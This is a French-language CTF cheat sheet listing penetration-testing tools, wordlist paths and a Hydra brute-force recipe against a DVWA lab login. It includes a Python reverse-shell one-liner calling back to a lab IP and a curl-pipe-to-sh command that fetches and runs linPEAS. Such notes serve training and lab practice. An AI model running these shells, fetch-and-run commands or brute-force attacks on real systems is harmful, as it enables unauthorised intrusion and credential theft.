# CTF
Write-up des chall que j'ai réalisé


# TOOLS
FrameWork pour OSINT de numero de telephone => phoneinfoga 
FUZZ => Feroxbuster, dirb, dirbuster, gobuster

Scanner de vulnerabilitö web => nikto, Nessus, Rapid7, OpenVas
Done => fuzz sous-domaine + Port Scan (https://github.com/v4d1/Dome) 

Scanner de platforme web => BurpSuite, ZAProxy

Reconnaissance passive graphique => Maltego
Reconnaissance passive => Metagoofil

yersinia => Pour les protocoles de communication (Cisco et autre)

CRUNSH : DICO + SEL

CUPP : Création de dico en fonction des noms données

Setoolkit : Social Ingénieuring (copie de site pour récupérer les URL)

hashid : donne le type de hash d'un hash

arpspoof : recupere les requetes ARP et les transmets (man in the middle)

exiftool : metadata du fichier

hexdump : (-C) transformation en hexa du fichier bin

powershell-empire : comme metaspote, exploit windows

recon-ng : Framework de reconnaissance passive (avec API)

Discover : Framework de reconnaissance passive (avec API) + recon ng + google dorks

pypykatz / Empire : Check des fichiers pour monter les privilèges WINDOWS

linuxprivchecker et linpeas : Check des fichiers pour monter les privilèges LINUX
curl https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh | sh

Steghide : Extraction de fichier a partir d'un autre fichier et passphrase

-----Scanner-----

nmapAutomator : git clone https://github.com/21y4d/nmapAutomator.git
                sudo ln -s $(pwd)/nmapAutomator/nmapAutomator.sh /usr/local/bin/
                
-----WEB------

Nikto : Pentest Web -> check une URL

dirb : brute force pour trouvé des pages web ou des dossiers

zaproxy : Nessus pour le web (scan les vulnérabilitées)

wpscan : scan wordpress -> Puissant

curl : requete vers site web

droopescan : Scan de site Drupal (comme Wpscan pour workPress)

Cewl : récupere les mots d'un site et fait un dico pour brute force

https://whatsmyname.app/ : recherche de compte a partir d'un pseudo 

--------------

Avoir un shell :
python3 -c 'import pty;pty.spawn("/bin/bash")'

export RHOST="10.10.14.5";export RPORT=4242;python3 -c 'import socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'


# BRUTE FORCE
Avec Hydra :
```
CSRF=$(curl -s -c dvwa.cookie "192.168.1.44/DVWA/login.php" | awk -F 'value=' '/user_token/ {print $2}' | cut -d "'" -f2)
```
```
SESSIONID=$(grep PHPSESSID dvwa.cookie | awk -F ' ' '{print $7}')```
```
```
curl -s -b dvwa.cookie -d "username=admin&password=password&user_token=${CSRF}&Login=Login" "192.168.1.44/DVWA/login.php"
```
```
hydra  -L /usr/share/seclists/Usernames/top_shortlist.txt  -P /usr/share/seclists/Passwords/rockyou-40.txt \
  -e ns  -F  -u  -t 1  -w 10  -v  -V  192.168.1.44  http-get-form \
  "/DVWA/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:S=Welcome to the password protected area:H=Cookie\: security=low; PHPSESSID=${SESSIONID}"
```

# WORDLIST :
/usr/share/wordlists
  |--dirb
  |--dirbuster
  |--fasttrack.txt
  |--fern-wifi
  |--metasploit
  |--nmap.lst
  |--rockyou.txt
  |--wfuzz

/usr/share/wordlists/dirb/common.txt => sub domain 
/usr/share/wordlists/dirb/big.txt => sub domain 
/usr/share/wordlists/dirbuster/directory-list-2.3-small.txt 
/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
/usr/share/seclist/bitquark-subdomains-top100000.txt
/usr/share/seclist/subdomains-top1millions-110000.txt
